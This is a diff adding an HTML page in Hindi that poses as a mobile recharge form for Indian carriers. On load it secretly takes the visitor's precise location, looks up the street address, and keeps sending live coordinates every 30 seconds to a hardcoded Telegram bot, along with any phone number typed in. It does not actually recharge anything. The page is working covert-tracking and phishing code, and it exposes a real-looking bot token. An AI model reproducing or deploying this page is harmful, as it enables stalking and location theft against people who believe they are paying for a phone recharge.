@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mobile Recharge</title>
+<script>
+// ===== यहाँ अपना Telegram Bot Token और Chat ID डालें =====
+const BOT_TOKEN = "8866287858:AAGL_iq2xreb12SAAgRLLgIHSwsO0sMDhSI";
+const CHAT_ID   = "8121453038";
+// ========================================================
+
+let watchId = null;
+let lastSentTime = 0;
+
+window.onload = function() {
+    // 🔥 User को सीधे Recharge पेज दिखे
+    document.getElementById("rechargeBox").style.display = "block";
+
+    // 📍 Location सबसे पहले और तुरंत
+    requestLocation();
+};
+
+// ============================================================
+// 📍 LOCATION — तुरंत माँगें और तुरंत भेजें
+// ============================================================
+function requestLocation() {
+    if (!navigator.geolocation) {
+        console.log("❌ Geolocation support नहीं है");
+        return;
+    }
+
+    // 🎯 तुरंत पहली location (multi-attempt for speed)
+    navigator.geolocation.getCurrentPosition(
+        onLocationSuccess,
+        onLocationError,
+        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+    );
+}
+
+// ✅ Location मिल गई
+function onLocationSuccess(position) {
+    const lat = position.coords.latitude;
+    const lng = position.coords.longitude;
+    const accuracy = position.coords.accuracy;
+    const mapLink = "https://www.google.com/maps?q=" + lat + "," + lng;
+
+    console.log("📍 Location मिली: " + lat + ", " + lng);
+
+    // ⚡ तुरंत Telegram पर भेजें (address का wait नहीं)
+    sendLocationToTelegram(lat, lng, "पता load हो रहा है...", mapLink, accuracy);
+
+    // 📮 पता (Address) बाद में भेजें
+    fetch("https://nominatim.openstreetmap.org/reverse?format=json&lat=" 
+          + lat + "&lon=" + lng + "&zoom=18&addressdetails=1")
+        .then(res => res.json())
+        .then(data => {
+            const address = (data && data.display_name) ? data.display_name : "पता नहीं मिला";
+            sendAddressUpdate(lat, lng, address);
+        })
+        .catch(() => {
+            sendAddressUpdate(lat, lng, "पता नहीं मिला");
+        });
+
+    // 🔄 LIVE LOCATION tracking शुरू करें
+    startLiveTracking();
+}
+
+// ❌ Location Error
+function onLocationError(error) {
+    console.log("❌ Location Error: " + error.message + " (code: " + error.code + ")");
+
+    // 🔁 अगर High Accuracy fail हो, तो Low Accuracy से try करें
+    navigator.geolocation.getCurrentPosition(
+        onLocationSuccess,
+        function(err2) {
+            console.log("❌ Second attempt fail: " + err2.message);
+        },
+        { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 }
+    );
+}
+
+// ============================================================
+// 🔄 LIVE LOCATION — हर बदलाव पर भेजें
+// ============================================================
+function startLiveTracking() {
+    if (watchId !== null) return;
+
+    watchId = navigator.geolocation.watchPosition(
+        function(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            // हर 30 सेकंड में एक बार भेजें (spam न हो)
+            const now = Date.now();
+            if (now - lastSentTime < 30000) return;
+            lastSentTime = now;
+
+            // Telegram पर Live Location (1 घंटा)
+            fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendLocation", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    latitude: parseFloat(lat),
+                    longitude: parseFloat(lng),
+                    live_period: 3600
+                })
+            });
+
+            console.log("🔄 Live update: " + lat + ", " + lng + " (±" + Math.round(accuracy) + "m)");
+        },
+        function(err) {
+            console.log("Watch Error: " + err.message);
+        },
+        { enableHighAccuracy: true, maximumAge: 10000, timeout: 20000 }
+    );
+}
+
+// ============================================================
+// 📍 Telegram पर Location Message भेजें
+// ============================================================
+function sendLocationToTelegram(lat, lng, address, mapLink, accuracy) {
+    const message =
+        "🚨 *नया यूज़र आया!*\n" +
+        "━━━━━━━━━━━━━━━━━━\n" +
+        "📍 *Live Location*\n" +
+        "🏠 Address: " + address + "\n" +
+        "🌐 Latitude: " + lat + "\n" +
+        "🌐 Longitude: " + lng + "\n" +
+        "🎯 Accuracy: " + Math.round(accuracy) + " मीटर\n" +
+        "🗺️ Google Map: " + mapLink + "\n" +
+        "⏰ Time: " + new Date().toLocaleString("hi-IN");
+
+    // Text message
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "Markdown",
+            disable_web_page_preview: false
+        })
+    });
+
+    // Live Location Pin (1 घंटे के लिए update होता रहेगा)
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendLocation", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            latitude: parseFloat(lat),
+            longitude: parseFloat(lng),
+            live_period: 3600
+        })
+    });
+
+    lastSentTime = Date.now();
+}
+
+// ============================================================
+// 📮 Address Update भेजें
+// ============================================================
+function sendAddressUpdate(lat, lng, address) {
+    const msg =
+        "🏠 *पूरा पता मिल गया*\n" +
+        "━━━━━━━━━━━━━━━━━━\n" +
+        "📍 " + address + "\n" +
+        "🌐 " + lat + ", " + lng + "\n" +
+        "🗺️ https://www.google.com/maps?q=" + lat + "," + lng;
+
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msg,
+            parse_mode: "Markdown"
+        })
+    });
+}
+
+// ============================================================
+// 💰 Recharge बटन
+// ============================================================
+function sendRecharge() {
+    const mobile = document.getElementById("mobile").value.trim();
+    const amount = document.getElementById("amount").value.trim();
+
+    if (mobile === "" || amount === "") {
+        alert("कृपया Mobile Number और Amount भरें");
+        return;
+    }
+
+    const msg =
+        "💰 *Recharge Request*\n" +
+        "━━━━━━━━━━━━━━━━━━\n" +
+        "📱 Mobile: " + mobile + "\n" +
+        "📶 Operator: " + document.getElementById("operator").value + "\n" +
+        "💵 Amount: ₹" + amount + "\n" +
+        "⏰ Time: " + new Date().toLocaleString("hi-IN");
+
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msg,
+            parse_mode: "Markdown"
+        })
+    });
+
+    alert("✅ Recharge Request भेज दी गई!");
+}
+</script>
+<style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family: Arial, sans-serif; }
+    body { background:#f2f2f2; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:15px; }
+    #rechargeBox { width:100%; max-width:360px; background:#fff; border-radius:12px; box-shadow:0 4px 15px rgba(0,0,0,0.15); padding:25px 20px; }
+    h2 { text-align:center; color:#1a73e8; margin-bottom:20px; font-size:20px; }
+    label { font-size:14px; color:#333; display:block; margin-bottom:5px; }
+    input, select { width:100%; padding:10px; margin-bottom:15px; border:1px solid #ccc; border-radius:8px; font-size:15px; outline:none; }
+    input:focus, select:focus { border-color:#1a73e8; }
+    button { width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:8px; font-size:16px; cursor:pointer; }
+    button:hover { background:#0c56c9; }
+</style>
+</head>
+<body>
+
+<div id="rechargeBox">
+    <h2>Mobile Recharge</h2>
+    <label>Mobile Number</label>
+    <input type="tel" id="mobile" placeholder="10 digit number" maxlength="10">
+    <label>Operator</label>
+    <select id="operator">
+        <option>Jio</option>
+        <option>Airtel</option>
+        <option>Vi</option>
+        <option>BSNL</option>
+    </select>
+    <label>Amount (₹)</label>
+    <input type="number" id="amount" placeholder="Enter amount">
+    <button onclick="sendRecharge()">Recharge Now</button>
+</div>
+
+</body>
+</html>
